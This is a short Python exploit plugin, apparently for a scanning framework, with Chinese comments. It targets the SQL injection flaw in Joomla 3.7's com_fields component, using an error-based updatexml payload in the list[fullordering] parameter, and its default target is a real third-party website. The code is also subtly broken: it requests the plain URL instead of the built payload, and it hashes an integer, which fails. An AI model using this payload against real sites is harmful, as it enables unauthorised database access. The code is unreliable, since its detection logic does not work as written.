#!/usr/bin/env python
#-*-coding:utf-8-*-

from modules.http import http
from modules.plugins import logger
import hashlib

author = "ushell"

# exploit 标题
title = "Joomla com_fields组件注入"

# 漏洞/exploit描述(可为空)
description = "component fields 组件字段未过滤"

# 漏洞KB引用(可为空)
reference = "https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html"

# exploit需要设置的参数
options = {
    "target" : "http://www.baidu.com"
}

# 核心函数
def exploit(options):
    # 日志回显
    logger.process("set exploit params...")

    # 获取设置的参数
    url = options["target"]["current_value"]

    payload = url + 'index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x5e,concat(1,(select md5(1))),1)'

    logger.process("send request...")

    # 请求
    response = http.get(url)

    flag = hashlib.md5(1)
    if flag.hexdigest() in response:
        logger.success("exploit success ! :)")
        return True
    else:
        logger.error("exploit fail ! :(")
        return False